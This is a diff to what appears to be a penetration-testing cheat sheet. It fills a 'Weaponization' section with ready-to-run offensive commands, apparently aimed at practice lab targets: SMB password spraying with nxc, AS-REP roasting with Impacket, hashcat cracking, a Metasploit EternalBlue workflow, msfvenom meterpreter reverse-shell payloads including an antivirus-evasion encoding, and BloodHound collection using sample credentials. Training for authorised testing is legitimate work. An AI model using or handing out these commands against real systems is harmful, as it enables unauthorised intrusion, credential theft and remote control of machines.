@@ -126,12 +126,104 @@ gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/We
 
 ```
 # Section 3. Weaponization
+ - NXC SMB/RDP Password Attacks
 ```
-COMING SOON...
+nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
+
+-u (path to users file)
+-p (path to wordlist)
+--ignore-pw-decoding (required to work with rockyou.txt)
+```
+ - Impacket Get-NPUsers
+```
+# Allows us to capture Kerberos Tickets for users that do not require Kerberos pre authentication
+Impacket-GetNPUsers –request –dc-ip 10.129.2.28 example.com/ -usersfile users.txt –format hashcat –outputfile kerb.hash
+
+# -request (requests Kerberos ticket)
+# -dc-ip (ip address of domain controller)
+# example.com/ (domain name)
+# -usersfile (text file with usernames to check)
+# -format (password cracking format)
+# -outputfile (name of file to save with tickets)
+```
+ - Cracking Hashes/Tickets with Hashcat
+```
+# Syntax: hashcat -a <attack-mode> -m <hash-type> <hash> <wordlist>
+Example 1: hashcat kerb.hash /usr/share/wordlist/rockyou.txt
+Example 2: hashcat -a 0 -m 18200 kerb.hash /usr/share/wordlist/rockyou.txt
+
+# List of hash types:
+https://hashcat.net/wiki/doku.php?id=example_hashes
+```
+ - Searchsploit
+```
+# We can search for exploits and vulnerabilities in software based on our nmap results using searchsploit
+
+# Syntax: searchsploit <software and version>
+# Examples:
+searchsploit httpd 2.4
+searchsploit –m <script name>                    # copies found exploits to your current directory
+```
+ -  Metasploit
+```
+# Example Workflow
+
+1. Run Metasploit
+msfconsole
+2. Search for an exploit
+search eternalblue
+3. Use the exploit
+use exploit/windows/smb/ms17_010_psexec
+4. Set options
+set RHOSTS 10.129.2.28
+set LHOST eth0
+5. Execute payload
+exploit
+
+```
+ - Msfvenom
+```
+# A command-line tool for generating payloads (e.g., reverse shells, bind shells).
+
+# Syntax: msfvenom –p <payload> <options> -f <format> -o <output_file>
+
+# Example Windows Payload:
+msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f exe –o shell.exe
+
+# Example Linux Payload:
+msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f elf –o shell.elf
+
+# Example Encoded Payload (AV bypass):
+msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –e x86/shikata_ga_nai –f exe –o encoded_shell.exe
+```
+ - Bloodhound
+```
+# Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.
+
+# Example Workflow
+1. Gernerate JSON files from the Active Directory database
+bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example.com –c all
+
+# -u username
+# -p password
+# -d domain name
+# -ns nameserver (domain controller)
+# -c all (gather all json files)
+
+2. Go to browser and typle:
+localhost:8080
+
+3. Enter username and password:
+Username: admin
+Password: <it will be same password as your kali password>
+
+4. Upload the JSON files
 ```
 # Section 4. Delivery
 ```
-COMING SOON...
+
+
+
 ```
 # Section 5. Privilege Escalation
 ```
